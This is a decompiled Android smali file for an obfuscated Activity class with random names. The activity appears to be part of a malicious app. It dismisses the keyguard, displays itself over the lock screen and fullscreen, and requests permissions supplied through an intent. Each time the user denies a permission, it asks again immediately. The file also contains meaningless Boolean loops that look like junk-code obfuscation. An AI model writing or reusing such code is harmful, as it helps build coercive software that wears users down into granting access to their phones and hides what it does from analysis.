.class public Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;
.super Landroid/app/Activity;
.source "pxhsoxfklpbneqxqqkjcdodsz6V2.java"


# static fields
.field public static ToAskNew:[Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 21
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 24
    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 25
    invoke-static {p0, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 5

    .line 36
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 76
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 37
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->requestWindowFeature(I)Z

    .line 39
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/16 v2, 0x400

    invoke-virtual {v1, v2, v2}, Landroid/view/Window;->setFlags(II)V

    const v1, 0x680400

    .line 43
    :try_start_0
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1b

    if-lt v3, v4, :cond_0

    .line 45
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getWindow()Landroid/view/Window;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/view/Window;->addFlags(I)V

    .line 47
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "keyguard"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/KeyguardManager;

    const/4 v4, 0x0

    .line 48
    invoke-virtual {v3, p0, v4}, Landroid/app/KeyguardManager;->requestDismissKeyguard(Landroid/app/Activity;Landroid/app/KeyguardManager$KeyguardDismissCallback;)V

    .line 49
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->setShowWhenLocked(Z)V

    goto :goto_4

    .line 53
    :cond_0
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1, v2, v1}, Landroid/view/Window;->setFlags(II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    .line 62
    :catch_0
    :try_start_1
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1, v2, v1}, Landroid/view/Window;->setFlags(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    .line 72
    :catch_1
    :try_start_2
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1, v2, v2}, Landroid/view/Window;->setFlags(II)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_4

    :catch_2
    move-object p1, v0

    .line 77
    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_1

    .line 83
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_0

    .line 92
    :cond_1
    :goto_1
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 98
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_1

    .line 107
    :cond_2
    :goto_2
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_3

    .line 113
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_2

    .line 122
    :cond_3
    :goto_3
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_4

    .line 128
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_3

    .line 143
    :cond_4
    :goto_4
    :try_start_3
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v1, "key"

    .line 144
    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->ToAskNew:[Ljava/lang/String;

    if-eqz p1, :cond_6

    .line 148
    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_prim:Ljava/lang/Boolean;

    const/16 p1, 0x97

    .line 150
    sget-object v0, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->ToAskNew:[Ljava/lang/String;

    .line 151
    invoke-static {p0, v0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_5

    .line 152
    invoke-static {p0, v0, p1}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    goto :goto_5

    .line 154
    :cond_5
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->finish()V

    goto :goto_5

    .line 159
    :cond_6
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->finish()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_5

    .line 164
    :catch_3
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->finish()V

    :goto_5
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    .line 173
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x97

    if-eq p1, p2, :cond_0

    goto :goto_0

    .line 177
    :cond_0
    array-length p1, p3

    if-lez p1, :cond_1

    const/4 p1, 0x0

    aget p3, p3, p1

    if-nez p3, :cond_1

    .line 179
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_prim:Ljava/lang/Boolean;

    .line 180
    invoke-virtual {p0}, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->finish()V

    goto :goto_0

    .line 184
    :cond_1
    sget-object p1, Lginom/alfa/lib/scan/pxhsoxfklpbneqxqqkjcdodsz6V2;->ToAskNew:[Ljava/lang/String;

    .line 187
    invoke-static {p0, p1, p2}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_0
    return-void
.end method
